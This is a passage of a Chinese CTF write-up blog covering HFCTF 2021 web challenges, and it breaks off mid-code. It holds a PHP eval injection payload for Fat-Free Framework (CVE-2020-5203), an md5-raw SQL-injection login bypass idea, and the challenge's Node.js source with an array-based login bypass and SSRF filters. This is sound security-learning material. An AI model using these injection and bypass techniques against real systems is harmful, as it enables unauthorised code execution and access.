class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p>也是有故事</p><p><img src="/img/2021hfctf/image-20210403175307159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175307159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175307159"></p><p>开开心心本地分析了一波弄出来了，线上一打，啥返回都没= =，，我在想..</p><p>你这不是考察 CVE-2020-5203 根据 3.7.2的代码修改记录 <a href="https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829">https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829</a> 来写 3.7.1 的exp么？</p><p>你不是。。3.7.2 吧？晕，于是想办法找，找到了 changlog 来确定版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib&#x2F;CHANGELOG.md</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403194520727.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403194520727.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403194520727"></p><p>草，慢慢分析吧，其实漏洞触发点是类似的</p><p><img src="/img/2021hfctf/image-20210403175851985.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175851985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175851985"></p><p><img src="/img/2021hfctf/image-20210403175931732.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175931732.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175931732"></p><p>由上两图，<code>$f3</code> 是 <code>Base</code> 实例，这个类重载了 <code>__unset</code> 魔术方法，然后这个 <code>$key</code> 参数是可控的</p><p><img src="/img/2021hfctf/image-20210403180041983.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180041983.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180041983"></p><p>也就是说，调用 <code>unset($f3-&gt;$a);</code> 会触发该魔术方法，跟进 <code>$this-&gt;offsetunset</code> 方法，调用 <code>$this-&gt;clear</code> 方法</p><p><img src="/img/2021hfctf/image-20210403180152159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180152159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180152159"></p><p>继续跟进，</p><p><img src="/img/2021hfctf/image-20210403180437548.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180437548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180437548"></p><p>刚刚说到，这个 <code>$key</code> 参数是可控的，也就是说，这个 <code>eval</code> 里的 <code>$val</code> 是可控的</p><p><img src="/img/2021hfctf/image-20210403180630972.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180630972.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180630972"></p><p>问题是，3.7.2 版本打过补丁， <code>$this-&gt;compile</code>  方法和之前的不同，如果用 3.7.1 版本的exp 打，断点调试，会发现最终 <code>$val</code> 构造出来是类似于 <code>&quot;[&#39;xxx;eval_code&#39;]&quot;</code> ，无论怎样都会被包括在引号里的。</p><p>先传入 <code>/?a=s</code></p><p><img src="/img/2021hfctf/image-20210403183838570.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403183838570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403183838570"></p><p>右边红框框住的部分和原本有点不一样，就是把写在一起的提取出来，赋值到变量里方便查看变化</p><p>经过 <code>$this-&gt;compile</code> 预处理值 <code>$pre</code> 为 <code>$hive[&#39;s&#39;]</code> ，</p><p>要后被 <code>eval</code> 的部分 <code>$pinjie</code> 为 <code>&quot;unset($this-&gt;hive[&#39;s&#39;]);&quot;</code> 。</p><p>到这里我们明白了大概的数据流，即设法构造 <code>$_GET[&#39;a&#39;]</code> 使我们的恶意代码可以被 <code>eval</code></p><p>这里绕过有两个点</p><ul><li>数组闭合</li><li>注释闭合多余部分</li></ul><p>继续尝试构造传入 <code>a=s[]);</code></p><p><img src="/img/2021hfctf/image-20210403184354702.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403184354702.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403184354702"></p><p>可以看到 <code>$pre</code> 部分已经成功被闭合了，但是有个问题，</p><p> <code>$pinjie</code> 部分拼接不正常</p><p><code>unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]);</code> 这部分正常，但多了 <code>);</code></p><div class="note quote"><p>至于为什么我这么熟练，直接用数组给闭合了，，因为一开始，，在分析 3.7.1 时，把代码流，包括 <code>$this-&gt;compile</code> 部分给整明白了，然后 3.7.2 重构了 <code>$this-&gt;compile</code> 很类似，有兴趣可以去看看，就是正则有点多和复杂。。。看的头皮发麻</p></div><p>尝试传入 <code>a=s[]);phpinfo();//</code> 这样，反正后面多了的 <code>);</code> 会被注释掉（好像和我新年出的 CTF 有点像，要闭合加注释），断点看看呗</p><p><img src="/img/2021hfctf/image-20210403185337497.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185337497.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185337497"></p><p><img src="/img/2021hfctf/image-20210403185407122.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185407122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185407122"></p><p>然后线上环境 cat 一下就好了</p><p><img src="/img/2021hfctf/image-20210403185505318.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185505318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185505318"></p><h2 id="“慢慢做”-管理系统"><a href="#“慢慢做”-管理系统" class="headerlink" title="“慢慢做” 管理系统"></a>“慢慢做” 管理系统</h2><p>没做出来，写思路，后续补上</p><p>提示</p><blockquote><p>第一步登录的sql语句是”SELECT * FROM users WHERE password = ‘“.md5($password,true).”‘ limit 0,1”;</p></blockquote><p>元老级 <code>md5($password,true)</code> 绕过，以前实验吧刷过，可以看以下链接</p><p><a href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p><p>但是。。黑人问号.jpg </p><p><img src="/img/2021hfctf/image-20210403190124297.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190124297.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190124297"></p><p>好，你说题目描述重要</p><blockquote><p><strong>这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。</strong></p></blockquote><p>完全不知道 ssrf 的点在哪，一共就发现 index.php admin.php 和 flag.php 三个文件，好了，没思路了。（还是太菜了</p><h2 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h2><p>没做出来，但是感觉接近了</p><p>admin/admin 一把梭，</p><p><img src="/img/2021hfctf/image-20210403190428006.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190428006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190428006"></p><p>密码竟然是错的，不过有提示</p><p>访问 <code>/source</code> 获取源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] </span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">        req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!status) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// test url</span></span><br><span class="line">    <span class="comment">// not implemented here</span></span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">    <span class="keyword">await</span> axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">    <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(method == <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">            result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">        result.content = error.message</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;route.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure><p>查看 <code>login</code> 方法，也就是要满足以下条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.session.admin = hash === adminHash</span><br></pre></td></tr></table></figure><p>其中我们传入的为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br></pre></td></tr></table></figure><p>然后见代码 13 和 15行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br></pre></td></tr></table></figure><p>也就是说，用户名和密码都要是 admin 但是，，他们长度和内容不一样  = =，好，非常好，还好 js 有的特性和 PHP 有点类似，<code>username</code> 用数组即可绕过</p><p><img src="/img/2021hfctf/image-20210403192049950.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192049950.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192049950"></p><p><img src="/img/2021hfctf/image-20210403192514722.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192514722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192514722"></p><p>登录成功后，我们要想办法访问 <code>/flag</code> 接口，不过必须为内网 ip</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) 